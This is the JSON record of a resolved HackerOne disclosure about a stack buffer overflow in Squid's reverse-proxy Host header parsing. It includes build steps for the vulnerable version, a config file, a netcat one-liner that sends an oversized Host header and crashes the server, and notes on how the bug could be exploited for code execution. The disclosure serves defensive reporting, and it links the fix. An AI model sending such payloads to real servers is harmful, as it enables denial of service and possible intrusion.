{
  "id": 778610,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Nzg2MTA=",
  "url": "https://hackerone.com/reports/778610",
  "title": "Squid as reverse proxy RCE and data leak",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-01-20T21:46:26.550Z",
  "submitted_at": "2020-01-20T21:46:26.550Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "guido",
    "url": "/guido",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ5D3DAKJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T015048Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEID%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF%2B3UPYvUglW%2Fbx9s1joh%2BI1mV%2FZfHMSYvzeSJNyQdNMAiEAjX%2F17c9tQd7hnM9BL8wb3I0rwZsFDopcX%2FAYdOmflQoquwUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNP9U0XyOIZwHAW1HyqPBW4MBwdDHI7S5eHcs0Z3PgG25SMZ9CvKqfjSa7gDoWVCaEs0tUlsPfdLE8im8mZXBT465yHnRS3m2xT0%2BDtT1ek1MqkLmTwqqjjtmAf3nMh1mUsCMO5%2Fa8VeesQHFpfktEUsVWv8gaNNdHMMubwbqKGxR7N6UuzcGYVQo58GfG1o7qolLtPvGP5DGyiX2FhoKfaFfFOtfESPIuWK8d%2BWR0ZSl8MefKT9V8qJRaCX9v5tRUaa07KA1LMEokTS8neI%2BYhZqrfY1kT%2Fp%2BU2SauvqbdyRhOUv2dAzqix%2FD%2FSTawZXXEQHhFhppsQ0RPgabkaKTEqiZQZpm0xaJDZgkxMeOXTK5hNiq4jFNZkJuGDap%2BMG2YTd%2BmChH6OPyD%2Fh06hagLt5pHY6Q49GiL28SiwkgPNkRH5KzvOZZXoMLngH92%2BOvG3mzljoCEou6WM7o1zNAya6S6fNi%2BwNfxLBX65%2FPipoQi4CVGCYBAzCdem5j8m81v3G9kPuMMar2rJkYRDSX5NP3hhH2HO5CtdUxYQFlcWelT0hEVs8gCeq2R5LmV%2Be7tyOVEAasnbQA8N0qWqFJmHd3uzG0u1do31ShcgvhYjaMzzYOkfi0xaxVAHBvnIGemtjfWWWOJpPoDVV%2BSvrn%2F8p0FCFIN4K884d%2BURX9GXItH467K2YfpL6URldRW52C0U%2FzntA%2BDiF%2B9pNWETKVpyTjQpEPiHGcz5lzQct90SlVgc3T3lwYliVb4OonPGMH8xvYLqTddpMBDCJRaxL2BLvsmifXBQTm9Iyr0CT64XHLn5UBaz4%2BW0EhERggczOrwTo%2B3lbTerwtzw933bZk%2BB6XCQbptiG5G66MP7rQCAUTy%2BeuiSObRjLBkMEdAwwP%2B8xgY6sQGDUj85UynevAkoqiuKt4bRt1YZxteBi7bYKQPmH8LCA04fhz%2F8F0vChzzfkiWADBI3zbd3JwTLlfkmYgjNlmMG6xqocr3YPVIEB%2BTgRXuQ3heO9gcZ4cy00IRUXk7smZq4eQM48taXkWcvkr2SfulnfDP381kAVdxhh%2FoOp%2Brepeg5fE7Zy5NJTTk3mtWw6tH5hyJx7f%2BovYwNtq4u3WK2CB0MYqzLeK2bopaTWsUhuSE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c743d8813a3e6478a9e62b3e87b9298acdce34b9e717685c249c0dc7ecc23343",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ5D3DAKJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T015048Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEID%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF%2B3UPYvUglW%2Fbx9s1joh%2BI1mV%2FZfHMSYvzeSJNyQdNMAiEAjX%2F17c9tQd7hnM9BL8wb3I0rwZsFDopcX%2FAYdOmflQoquwUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNP9U0XyOIZwHAW1HyqPBW4MBwdDHI7S5eHcs0Z3PgG25SMZ9CvKqfjSa7gDoWVCaEs0tUlsPfdLE8im8mZXBT465yHnRS3m2xT0%2BDtT1ek1MqkLmTwqqjjtmAf3nMh1mUsCMO5%2Fa8VeesQHFpfktEUsVWv8gaNNdHMMubwbqKGxR7N6UuzcGYVQo58GfG1o7qolLtPvGP5DGyiX2FhoKfaFfFOtfESPIuWK8d%2BWR0ZSl8MefKT9V8qJRaCX9v5tRUaa07KA1LMEokTS8neI%2BYhZqrfY1kT%2Fp%2BU2SauvqbdyRhOUv2dAzqix%2FD%2FSTawZXXEQHhFhppsQ0RPgabkaKTEqiZQZpm0xaJDZgkxMeOXTK5hNiq4jFNZkJuGDap%2BMG2YTd%2BmChH6OPyD%2Fh06hagLt5pHY6Q49GiL28SiwkgPNkRH5KzvOZZXoMLngH92%2BOvG3mzljoCEou6WM7o1zNAya6S6fNi%2BwNfxLBX65%2FPipoQi4CVGCYBAzCdem5j8m81v3G9kPuMMar2rJkYRDSX5NP3hhH2HO5CtdUxYQFlcWelT0hEVs8gCeq2R5LmV%2Be7tyOVEAasnbQA8N0qWqFJmHd3uzG0u1do31ShcgvhYjaMzzYOkfi0xaxVAHBvnIGemtjfWWWOJpPoDVV%2BSvrn%2F8p0FCFIN4K884d%2BURX9GXItH467K2YfpL6URldRW52C0U%2FzntA%2BDiF%2B9pNWETKVpyTjQpEPiHGcz5lzQct90SlVgc3T3lwYliVb4OonPGMH8xvYLqTddpMBDCJRaxL2BLvsmifXBQTm9Iyr0CT64XHLn5UBaz4%2BW0EhERggczOrwTo%2B3lbTerwtzw933bZk%2BB6XCQbptiG5G66MP7rQCAUTy%2BeuiSObRjLBkMEdAwwP%2B8xgY6sQGDUj85UynevAkoqiuKt4bRt1YZxteBi7bYKQPmH8LCA04fhz%2F8F0vChzzfkiWADBI3zbd3JwTLlfkmYgjNlmMG6xqocr3YPVIEB%2BTgRXuQ3heO9gcZ4cy00IRUXk7smZq4eQM48taXkWcvkr2SfulnfDP381kAVdxhh%2FoOp%2Brepeg5fE7Zy5NJTTk3mtWw6tH5hyJx7f%2BovYwNtq4u3WK2CB0MYqzLeK2bopaTWsUhuSE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=245688c923c6dad281676ae388d8556c09e182f0705474dc6b79f3c6cfb41d30"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-08-26T23:10:11.757Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2021-07-27T23:10:09.545Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThis was a very difficult experience as Squid maintainers took a long time to answer. I tried getting help from HackerOne support, Dropbox support and the Internet Bug Bounty (never e-mailed me back) to no avail. What could have taken a few days took months.\n\nThe vulnerability concerns a stack buffer overflow (write) in parsing of the Host header if Squid acts as a reverse proxy.\n\nThe bug is fixed in Squid 4.10 released on 20 Jan 2020 which can be found here: http://www.squid-cache.org/Versions/v4/\n\n## Steps To Reproduce:\n```\nmkdir squid-poc\ncd squid-poc/\nwget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'\ntar zxf SQUID_4_8.tar.gz\nmkdir squid-install\ncd squid-SQUID_4_8/\nautoreconf -if\n./configure --prefix=$(realpath ../squid-install)\nmake -j$(nproc)\nmake install\ncd ../squid-install/sbin/\n```\n\nCreate a file ```squid.conf``` with this contents. This is based on the instructions at https://wiki.squid-cache.org/ConfigExamples/Reverse/BasicAccelerator\n\n```\nhttp_port 9999 accel defaultsite=127.0.0.1 vhost vport=1\ncache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel\nacl our_sites dstdomain your.main.website.name\nhttp_access allow our_sites\ncache_peer_access myAccel allow our_sites\ncache_peer_access myAccel deny all\n```\n\nRun Squid:\n\nThe following is a oneliner to launch Squid and send the payload that crashes it:\n\n```\n./squid -N -f squid.conf & sleep 1 && echo -en \"GET / HTTP/1.1\\x0D\\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\\x0D\\x0A\\x0D\\x0A\" | nc localhost 9999\n```\n\nOutput:\n\n```\n[1] 19871\n*** buffer overflow detected ***: ./squid terminated\n[1]+  Aborted                 (core dumped) ./squid -N -f squid.conf\n```\n\n## Supporting Material/References:\n\nExploitation with -fstack-protector enabled is impossible.\nSome compilers don't enable -fstack-protector by default (like Clang without optimization flags).\n\nWithout stack protector, exploitation is relatively easy on 32 bit as valid addresses normally don't require a leading zero byte (which cannot be written by the payload, because the affected code treats it as a null-terminated string).\nOn 64 bit it is more difficult, but not necessarily impossible. Rather than overwriting the return address, changing the value of a (for instance boolean) configuration variable may be used.\n\nUnlike glibc, musl libc is used does not write a NULL byte to the destination buffer if the size argument is very large, which happens here due to an overflowing subtraction. Hence, exploitation may be easier on systems that use musl libc, like OpenWRT and Alpine Linux.\n\nThere is also a small data leak for payloads of a particular length. This does not crash Squid, and makes it return uninitialized bytes located after the string buffer, usually just several (until a NULL byte is reached).\n\nFix: https://github.com/squid-cache/squid/pull/519\n\n## Impact\n\nRemote code execution (under certain circumstances), crashing a server (under most circumstances), leaking data from the server (under most circumstances).",
  "weakness": {
    "id": 3,
    "name": "Classic Buffer Overflow"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-08-26T23:10:09.680Z",
  "allow_singular_disclosure_after": -128400038.9331112,
  "singular_disclosure_allowed": true,
  "vote_count": 17,
  "voters": [
    "tolga",
    "fqdn",
    "ali",
    "kaulse",
    "run_win",
    "akashhamal0x01",
    "f_m",
    "maclok",
    "gefif4078",
    "aseem0xff",
    "and 7 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 84124,
    "asset_type": "OTHER",
    "asset_identifier": "IBB (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
